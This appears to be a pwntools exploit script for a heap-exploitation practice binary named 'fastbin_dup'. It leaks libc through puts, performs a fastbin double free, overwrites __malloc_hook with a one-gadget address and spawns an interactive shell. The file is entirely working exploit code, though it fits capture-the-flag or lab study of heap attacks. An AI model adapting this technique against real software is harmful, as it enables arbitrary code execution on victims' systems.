from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./fastbin_dup', checksec=False)
libc = elf.libc

environ = {"LD_PRELOAD": libc.path}

gs = """
b *main
b *main+235
b *main+401
b *main+503
"""
index = 0

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)

def start():
    if args.GDB:
        return gdb.debug(elf.path, env=environ, gdbscript=gs)
    else:
        return process(elf.path)
    
def send_name(name):
    sa(b'Enter your username: ', name)
    
def malloc(size, data):
    global index
    s(b'1')
    sa(b'size: ', f'{size}'.encode())
    sa(b'data: ', data)
    rcu(b'> ')
    index += 1
    return index -1

def free(index):
    s(b'2')
    sa(b'index: ', f'{index}'.encode())
    rcu(b'> ')
        
    
io = start()
# Remove timeout for debugging
io.timeout = 0.1

rcu(b'puts() @ ')
puts_leak = int(io.recvline(), 16)
success("puts: " + hex(puts_leak))

libc.address = puts_leak - libc.sym['puts']
success("libc: " + hex(libc.address))
send_name(b'Broder')

chunk_A = malloc(0x68, b'a'*0x68)
chunk_B = malloc(0x68, b'b'*0x68)

free(chunk_A)
free(chunk_B)
free(chunk_A)

dup = malloc(0x68, p64(libc.sym['__malloc_hook'] - 35))
malloc(0x68, b'c'*0x68)
malloc(0x68, b'd'*0x68)

malloc(0x68, b'a'*19 + p64(libc.address + 0xe1fa1))

s(b'1')
sa(b'size: ', b'100')
io.interactive()
